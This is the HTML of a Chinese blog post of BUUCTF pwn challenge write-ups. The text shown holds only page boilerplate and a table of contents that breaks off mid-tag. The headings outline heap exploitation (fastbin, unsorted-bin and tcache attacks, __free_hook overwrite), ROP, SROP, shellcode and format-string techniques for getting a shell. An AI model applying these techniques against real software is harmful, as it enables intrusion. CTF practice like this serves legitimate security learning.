<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>CTF-BUUCTF-Pwn刷题之旅-(1) | 咲夜南梦's 博客</title><meta name="description" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta name="keywords" content="CTF,Pwn"><meta name="author" content="咲夜南梦,196011564@qq.com"><meta name="copyright" content="咲夜南梦"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta name="twitter:description" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta name="twitter:image" content="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/bg.png"><meta property="og:type" content="article"><meta property="og:title" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta property="og:url" content="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"><meta property="og:site_name" content="咲夜南梦's 博客"><meta property="og:description" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta property="og:image" content="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/bg.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"><link rel="prev" title="CTF-安恒杯-19年7月赛" href="http://yoursite.com/2019/07/15/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-19%E5%B9%B47%E6%9C%88%E8%B5%9B/"><link rel="next" title="CTF-赛博杯CyberCTF-19年7月" href="http://yoursite.com/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: true,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="咲夜南梦's 博客" type="application/atom+xml">
</head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">咲夜南梦's 博客</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 额外功能</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">130</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">44</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">24</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 额外功能</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x01-warmup-csaw-2016"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">0x01 warmup_csaw_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x02-RIP覆盖一下"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">0x02 RIP覆盖一下</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x03-babyfengshui-33c3-2016"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">0x03 babyfengshui_33c3_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x04-babyheap-0ctf-2017"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">0x04 babyheap_0ctf_2017</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x05-get-started-3dsctf-2016"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">0x05 get_started_3dsctf_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x06-not-the-same-3dsctf-2016"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">0x06 not_the_same_3dsctf_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x07-bugbug-codegate-2016"><span class="toc_mobile_items-number">7.</span> <span class="toc_mobile_items-text">0x07 bugbug_codegate_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x08-ez-pz-hackover-2016"><span class="toc_mobile_items-number">8.</span> <span class="toc_mobile_items-text">0x08 ez_pz_hackover_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x09-tiny-backdoor-v1-hackover-2016"><span class="toc_mobile_items-number">9.</span> <span class="toc_mobile_items-text">0x09 tiny_backdoor_v1_hackover_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x10-bbys-tu-2016"><span class="toc_mobile_items-number">10.</span> <span class="toc_mobile_items-text">0x10 bbys_tu_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x11-oneshot-tjctf-2016"><span class="toc_mobile_items-number">11.</span> <span class="toc_mobile_items-text">0x11 oneshot_tjctf_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x12-pwn1-sctf-2016"><span class="toc_mobile_items-number">12.</span> <span class="toc_mobile_items-text">0x12 pwn1_sctf_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x13-pwn2-sctf-2016"><span class="toc_mobile_items-number">13.</span> <span class="toc_mobile_items-text">0x13 pwn2_sctf_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x14-ciscn-2019-c-1"><span class="toc_mobile_items-number">14.</span> <span class="toc_mobile_items-text">0x14 ciscn_2019_c_1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x15-ciscn-2019-n-1"><span class="toc_mobile_items-number">15.</span> <span class="toc_mobile_items-text">0x15 ciscn_2019_n_1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x16-ciscn-2019-n-8"><span class="toc_mobile_items-number">16.</span> <span class="toc_mobile_items-text">0x16 ciscn_2019_n_8</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x17-ciscn-2019-sw-7"><span class="toc_mobile_items-number">17.</span> <span class="toc_mobile_items-text">0x17 ciscn_2019_sw_7</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x18-espcially-tu-2016"><span class="toc_mobile_items-number">18.</span> <span class="toc_mobile_items-text">0x18 espcially_tu_2016</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解法一"><span class="toc_mobile_items-number">18.1.</span> <span class="toc_mobile_items-text">解法一:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解法二"><span class="toc_mobile_items-number">18.2.</span> <span class="toc_mobile_items-text">解法二:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x19-ciscn-2019-en-2"><span class="toc_mobile_items-number">19.</span> <span class="toc_mobile_items-text">0x19 ciscn_2019_en_2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x20-ciscn-s-4"><span class="toc_mobile_items-number">20.</span> <span class="toc_mobile_items-text">0x20 ciscn_s_4</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x21-ciscn-2019-n-3"><span class="toc_mobile_items-number">21.</span> <span class="toc_mobile_items-text">0x21 ciscn_2019_n_3</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#1、利用unsorted-bin-attack知道libc地址"><span class="toc_mobile_items-number">22.</span> <span class="toc_mobile_items-text">1、利用unsorted bin attack知道libc地址</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2、存在UAF漏洞，然后利用fastbin-attack，实现堆块重叠，且通过利用unsorted-bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串"><span class="toc_mobile_items-number">23.</span> <span class="toc_mobile_items-text">2、存在UAF漏洞，然后利用fastbin attack，实现堆块重叠，且通过利用unsorted bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x22-ciscn-s-8"><span class="toc_mobile_items-number">24.</span> <span class="toc_mobile_items-text">0x22 ciscn_s_8</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload"><span class="toc_mobile_items-number">24.1.</span> <span class="toc_mobile_items-text">导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add-rax-1换成add-rax-3，缩短ROPchain，达成攻击。注意不换成add-rax-3会出现ROPchain被截断的情况"><span class="toc_mobile_items-number">24.2.</span> <span class="toc_mobile_items-text">另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add rax,1换成add rax,3，缩短ROPchain，达成攻击。注意不换成add rax,3会出现ROPchain被截断的情况</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x23-ciscn-s-3"><span class="toc_mobile_items-number">25.</span> <span class="toc_mobile_items-text">0x23 ciscn_s_3</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#gadget处可以赋值rax为15，恰好为SYS-SigReturnFrame"><span class="toc_mobile_items-number">25.1.</span> <span class="toc_mobile_items-text">gadget处可以赋值rax为15，恰好为SYS_SigReturnFrame</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#那么思路如下"><span class="toc_mobile_items-number">25.2.</span> <span class="toc_mobile_items-text">那么思路如下:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1、先leak-stack地址，然后顺带的传入-bin-sh-x00字符串，通过leak-stack来定位binsh的位置，再跳回SYS-read处"><span class="toc_mobile_items-number">25.3.</span> <span class="toc_mobile_items-text">1、先leak stack地址，然后顺带的传入&#x2F;bin&#x2F;sh\x00字符串，通过leak stack来定位binsh的位置，再跳回SYS_read处</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2、赋值rax为15，跳到syscall上，成功popal-sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell"><span class="toc_mobile_items-number">25.4.</span> <span class="toc_mobile_items-text">2、赋值rax为15，跳到syscall上，成功popal sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x24-ciscn-2019-nw-6"><span class="toc_mobile_items-number">26.</span> <span class="toc_mobile_items-text">0x24 ciscn_2019_nw_6</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#程序没有任何保护，考虑shellcode"><span class="toc_mobile_items-number">26.1.</span> <span class="toc_mobile_items-text">程序没有任何保护，考虑shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去"><span class="toc_mobile_items-number">26.2.</span> <span class="toc_mobile_items-text">利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x25-judgement-mna-2016"><span class="toc_mobile_items-number">27.</span> <span class="toc_mobile_items-text">0x25 judgement_mna_2016</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过-xx-s来读取文本"><span class="toc_mobile_items-number">27.1.</span> <span class="toc_mobile_items-text">导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过$xx%s来读取文本</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x26-ciscn-nw-4"><span class="toc_mobile_items-number">28.</span> <span class="toc_mobile_items-text">0x26 ciscn_nw_4</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1、经过ida分析存在double-free，且show没有check，所以可以leak-heap-base和libc"><span class="toc_mobile_items-number">28.1.</span> <span class="toc_mobile_items-text">1、经过ida分析存在double free，且show没有check，所以可以leak heap_base和libc</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2、通过fastbin-attack修改unsorted-bin’s-bk，在free-hook处伪造fake-chunk，然后再用double-free-fastbin-attack修改free-hook的值为system，然后释放content为-bin-sh-x00的chunk即可"><span class="toc_mobile_items-number">28.2.</span> <span class="toc_mobile_items-text">2、通过fastbin attack修改unsorted bin’s bk，在free_hook处伪造fake_chunk，然后再用double free fastbin attack修改free_hook的值为system，然后释放content为&#x2F;bin&#x2F;sh\x00的chunk即可</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#最终因为ubuntu16-04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub-rsp-0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃"><span class="toc_mobile_items-number">28.3.</span> <span class="toc_mobile_items-text">最终因为ubuntu16.04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub rsp,0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x27-checker-seccon-2016"><span class="toc_mobile_items-number">29.</span> <span class="toc_mobile_items-text">0x27 checker_seccon_2016</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#首先这题开启了canary，且代码无法leak-canary，导致无法溢出"><span class="toc_mobile_items-number">29.1.</span> <span class="toc_mobile_items-text">首先这题开启了canary，且代码无法leak canary，导致无法溢出</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#考虑开启了canary，且存在无限输入，但是输入中遇到-x00会截断，所以考虑使用smash来leak任意地址数据"><span class="toc_mobile_items-number">29.2.</span> <span class="toc_mobile_items-text">考虑开启了canary，且存在无限输入，但是输入中遇到\x00会截断，所以考虑使用smash来leak任意地址数据</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#由于遇到-x00截断或遇到换行截断并替换为-x00，我们可以考虑先输入-xc0-x10-x60-x11-x11-x11，然后再输入-xc0-x10-x60-x11-x11，直到-xc0-x10-x60"><span class="toc_mobile_items-number">29.3.</span> <span class="toc_mobile_items-text">由于遇到\x00截断或遇到换行截断并替换为\x00，我们可以考虑先输入\xc0\x10\x60\x11\x11\x11，然后再输入\xc0\x10\x60\x11\x11，直到\xc0\x10\x60</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#如何找到argv-0-，只需调试器附加运行的程序，然后找到-文件名的字符串即可，比如我这里是-checker-seccon-2016，然后将flag的地址覆盖进去即可"><span class="toc_mobile_items-number">29.4.</span> <span class="toc_mobile_items-text">如何找到argv[0]，只需调试器附加运行的程序，然后找到.&#x2F;文件名的字符串即可，比如我这里是.&#x2F;checker_seccon_2016，然后将flag的地址覆盖进去即可</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x28-ciscn-2019-ne-5"><span class="toc_mobile_items-number">30.</span> <span class="toc_mobile_items-text">0x28 ciscn_2019_ne_5</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#典型的ROP题，ret2text"><span class="toc_mobile_items-number">30.1.</span> <span class="toc_mobile_items-text">典型的ROP题，ret2text</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x29-ciscn-2019-es-2"><span class="toc_mobile_items-number">31.</span> <span class="toc_mobile_items-text">0x29 ciscn_2019_es_2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x30-ciscn-2019-final-3"><span class="toc_mobile_items-number">32.</span> <span class="toc_mobile_items-text">0x30 ciscn_2019_final_3</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#这题总体不难，由于tcache-attack的利用很方便，所以这题只要leak-libc就可以轻而易举拿到shell"><span class="toc_mobile_items-number">32.1.</span> <span class="toc_mobile_items-text">这题总体不难，由于tcache attack的利用很方便，所以这题只要leak libc就可以轻而易举拿到shell</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache-attack修改-free-hook拿到shell"><span class="toc_mobile_items-number">32.2.</span> <span class="toc_mobile_items-text">简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache attack修改__free_hook拿到shell</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x31-ciscn-2019-en-3"><span class="toc_mobile_items-number">33.</span> <span class="toc_mobile_items-text">0x31 ciscn_2019_en_3</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x32-ciscn-2019-c-5"><span class="toc_mobile_items-number">34.</span> <span class="toc_mobile_items-text">0x32 ciscn_2019_c_5</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x33-ciscn-2019-es-4"><span class="toc_mobile_items-number">35.</span> <span class="toc_mobile_items-text">0x33 ciscn_2019_es_4</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#可以考虑用unlink来获得对chunk-list控制"><span class="toc_mobile_items-number">35.1.</span> <span class="toc_mobile_items-text">可以考虑用unlink来获得对chunk_list控制</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。"><span class="toc_mobile_items-number">35.2.</span> <span class="toc_mobile_items-text">将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#如果完成以上两行的攻击后，接下来只需要got-leak，然后libc-leak，然后写-free-hook为system即可"><span class="toc_mobile_items-number">35.3.</span> <span class="toc_mobile_items-text">如果完成以上两行的攻击后，接下来只需要got leak，然后libc leak，然后写__free_hook为system即可</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x34-ciscn-2019-es-1"><span class="toc_mobile_items-number">36.</span> <span class="toc_mobile_items-text">0x34 ciscn_2019_es_1</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#由于题目要求是2-29，但是环境是2-23，所以解法会有较大差别，但是按环境为主"><span class="toc_mobile_items-number">36.1.</span> <span class="toc_mobile_items-text">由于题目要求是2.29，但是环境是2.23，所以解法会有较大差别，但是按环境为主</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted-bin-attack和fastbin-attack的组合式攻击"><span class="toc_mobile_items-number">36.2.</span> <span class="toc_mobile_items-text">由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted bin attack和fastbin attack的组合式攻击</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1、leak-libc和heap-base这个攻击手法就不用多说了"><span class="toc_mobile_items-number">36.3.</span> <span class="toc_mobile_items-text">1、leak libc和heap_base这个攻击手法就不用多说了</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2、先两次double-free和fastbin-attack把被攻击堆块放入bins中，然后修改unsorted-bin的bk，使得free-hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc-0x18-完成unsorted-bin-attack，写入大数，然后同时malloc-0x68-fastbin-attack，覆盖free-hook为system"><span class="toc_mobile_items-number">36.4.</span> <span class="toc_mobile_items-text">2、先两次double free和fastbin attack把被攻击堆块放入bins中，然后修改unsorted bin的bk，使得free_hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc(0x18)完成unsorted bin attack，写入大数，然后同时malloc(0x68)fastbin attack，覆盖free_hook为system</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#然后free一个内容为-bin-sh-x00的堆块即可，推荐使用double-free之后，第二次add的堆块的内容设置为-bin-sh-x00"><span class="toc_mobile_items-number">36.5.</span> <span class="toc_mobile_items-text">然后free一个内容为&#x2F;bin&#x2F;sh\x00的堆块即可，推荐使用double free之后，第二次add的堆块的内容设置为&#x2F;bin&#x2F;sh\x00</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x35-ciscn-2019-sw-6"><span class="toc_mobile_items-number">37.</span> <span class="toc_mobile_items-text">0x35 ciscn_2019_sw_6</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#简单看一下程序的功能，发现是归并排序，然后会输出逆序数"><span class="toc_mobile_items-number">37.1.</span> <span class="toc_mobile_items-text">简单看一下程序的功能，发现是归并排序，然后会输出逆序数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak-canary"><span class="toc_mobile_items-number">37.2.</span> <span 